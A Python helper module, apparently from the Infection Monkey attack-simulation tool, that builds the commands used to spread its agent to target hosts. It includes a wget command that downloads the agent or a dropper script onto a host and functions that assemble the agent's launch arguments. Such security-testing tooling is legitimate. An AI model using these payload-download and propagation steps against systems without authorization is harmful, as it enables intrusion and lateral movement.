from pathlib import PurePath
from typing import List, Optional, Union

from common import OperatingSystem
from common.types import AgentID
from infection_monkey.exploit.tools.helpers import (
    AGENT_BINARY_PATH_LINUX,
    AGENT_BINARY_PATH_WIN64,
    get_agent_dst_path,
    get_dropper_script_dst_path,
)
from infection_monkey.i_puppet import TargetHost
from infection_monkey.model import CMD_CARRY_OUT, CMD_EXE, MONKEY_ARG

# Dropper target paths
DROPPER_TARGET_PATH_LINUX = AGENT_BINARY_PATH_LINUX
DROPPER_TARGET_PATH_WIN64 = AGENT_BINARY_PATH_WIN64


def build_agent_download_command(target_host: TargetHost, url: str):
    agent_dst_path = get_agent_dst_path(target_host)
    return build_download_command(target_host, url, agent_dst_path)


def build_dropper_script_download_command(target_host: TargetHost, url: str):
    dropper_script_dst_path = get_dropper_script_dst_path(target_host)
    return build_download_command(target_host, url, dropper_script_dst_path)


def build_download_command(target_host: TargetHost, url: str, dst: PurePath):
    if target_host.operating_system == OperatingSystem.WINDOWS:
        return build_download_command_windows(url, dst)

    return build_download_command_linux(url, dst)


def build_download_command_windows(url: str, dst: PurePath):
    raise NotImplementedError()


def build_download_command_linux(url: str, dst: PurePath):
    return f"wget -qO {dst} {url}"


def build_monkey_commandline(
    agent_id: AgentID, servers: List[str], depth: int, location: Union[str, PurePath, None] = None
) -> str:
    return " " + " ".join(
        build_monkey_commandline_parameters(
            agent_id,
            servers,
            depth,
            location,
        )
    )


def build_monkey_commandline_parameters(
    parent: Optional[AgentID] = None,
    servers: Optional[List[str]] = None,
    depth: Optional[int] = None,
    location: Union[str, PurePath, None] = None,
) -> List[str]:
    cmdline = []

    if parent is not None:
        cmdline.append("-p")
        cmdline.append(str(parent))
    if servers:
        cmdline.append("-s")
        cmdline.append(",".join(servers))
    if depth is not None:
        cmdline.append("-d")
        cmdline.append(str(depth))
    if location is not None:
        cmdline.append("-l")
        cmdline.append(str(location))

    return cmdline


def get_monkey_commandline_windows(destination_path: str, monkey_cmd_args: List[str]) -> List[str]:
    monkey_cmdline = [CMD_EXE, CMD_CARRY_OUT, destination_path, MONKEY_ARG]

    return monkey_cmdline + monkey_cmd_args


def get_monkey_commandline_linux(destination_path: str, monkey_cmd_args: List[str]) -> List[str]:
    monkey_cmdline = [destination_path, MONKEY_ARG]

    return monkey_cmdline + monkey_cmd_args
